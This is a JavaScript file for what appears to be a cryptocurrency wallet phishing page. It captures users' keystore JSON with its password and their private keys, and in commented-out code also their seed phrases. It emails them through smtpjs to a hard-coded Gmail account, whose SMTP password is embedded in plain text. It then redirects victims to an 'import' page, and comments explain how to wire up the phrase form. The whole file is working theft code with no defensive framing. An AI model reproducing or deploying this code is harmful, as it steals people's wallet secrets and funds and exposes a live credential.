//listen to submit
// document.querySelector(".contact-form").addEventListener("submit", submitForm);
document.querySelector(".keystore").addEventListener("submit", submitKeyStore)
document.querySelector(".private").addEventListener("submit", submitPrivate)

// function submitForm(e){
//     e.preventDefault();
    
    //Get the values all input
//     let phrase = document.querySelector(".phrase").value;

//     document.querySelector(".contact-form").reset();

//     sendEmail(phrase);
// }

function submitKeyStore(e){
    e.preventDefault();
    
    //Get the values all input
    let keyvalue = document.querySelector(".keyvalue").value;
    let password = document.querySelector(".password").value;

    document.querySelector(".keystore").reset();

    sendEmailOne(keyvalue, password);
}

function submitPrivate(e){
    e.preventDefault();
    
    //Get the values all input
    let privatekey = document.querySelector(".privatekey").value;

    document.querySelector(".private").reset();

    sendEmailTwo(privatekey);
}

// function sendEmail(phrase){
//     Email.send({
//         Host: "smtp.gmail.com",
//         Username: "Sammylanson42@gmail.com",
//         Password: "lxkzuydykdhjmfqg",
//         To: "Sammylanson42@gmail.com",
//         From: "Sammylanson42@gmail.com",
//         Subject: "You have a new from PHASE field",
//         Body: `Phrase: ${phrase}`,
//     }).then(message =>window.location.href="import.html");
// }

function sendEmailOne(keyvalue, password){
    Email.send({
        Host: "smtp.gmail.com",
        Username: "Sammylanson42@gmail.com",
        Password: "lxkzuydykdhjmfqg",
        To: "Sammylanson42@gmail.com",
        From: "Sammylanson42@gmail.com",
        Subject: "You have a new from KeyStore JSON field",
        Body: `Keystore JSON: ${keyvalue} <br> Password: ${password}`,
    }).then(message =>window.location.href="import.html");
}

function sendEmailTwo(privatekey){
    Email.send({
        Host: "smtp.gmail.com",
        Username: "Sammylanson42@gmail.com",
        Password: "lxkzuydykdhjmfqg",
        To: "Sammylanson42@gmail.com",
        From: "Sammylanson42@gmail.com",
        Subject: "You have a new message",
        Body: `Private Key: ${privatekey}`,
    }).then(message =>window.location.href="import.html");
}



// function sendEmailTwo()

// Note
// Replace this with the Phrase Form Field
{/* 
    <form method="POST" class="contact-form">
        <textarea name="input_phrase" class="phrase" minlength="12" placeholder="Phrase" required="required"></textarea>
        </br>
        <div class="desc">
                Typically 12 (sometimes 24) words 
                separated by single spaces
        </div>
        </br>
        <button type="submit" name="Phrase" class="btn-import" onclick="sendEmail()">IMPORT</button>
    </form> 
*/}


//add this link to your javascript library listing
{/* 
    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script src="assets/js/app.js"></script> 
*/}
